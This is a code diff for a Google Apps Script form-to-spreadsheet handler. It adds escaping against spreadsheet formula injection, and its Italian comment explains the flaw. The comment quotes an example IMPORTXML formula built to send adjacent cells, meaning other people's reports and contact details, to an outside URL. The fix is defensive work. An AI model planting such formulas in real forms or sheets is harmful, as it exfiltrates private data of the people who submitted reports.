@@ -89,7 +89,24 @@ function doPost(e) {
     return ContentService.createTextOutput('rifiutata');
   }
 
-  const taglia = (v) => String(v == null ? '' : v).slice(0, MASSIMO);
+  /*
+   * ════════════════════════════════════════════════════════════════════════
+   * UNA CELLA CHE COMINCIA PER = È UNA FORMULA, E appendRow LA ESEGUE.
+   *
+   * Difetto trovato il 15 settembre 2026. Questa funzione tagliava soltanto. Il
+   * percorso e' pubblico: modulo del sito -> /segnalazione -> KV -> questo
+   * foglio. Un =IMPORTXML("https://..."&A2) scritto in uno dei sei campi si
+   * esegue quando il titolare apre il foglio, e porta fuori le celle vicine —
+   * cioè le altre segnalazioni, con i contatti di chi le ha scritte.
+   *
+   * Il gettone protegge lo script da chi non lo conosce; non protegge il foglio
+   * da chi passa dalla porta legittima. L'apostrofo davanti dice al foglio
+   * «questo e' testo»: non si vede a schermo e non cambia il contenuto.
+   */
+  const taglia = (v) => {
+    const testo = String(v == null ? '' : v).slice(0, MASSIMO);
+    return /^[=+\-@\t\r]/.test(testo) ? "'" + testo : testo;
+  };
 
   // Senza testo non c'è segnalazione.
   if (!taglia(dati.testo).trim()) {
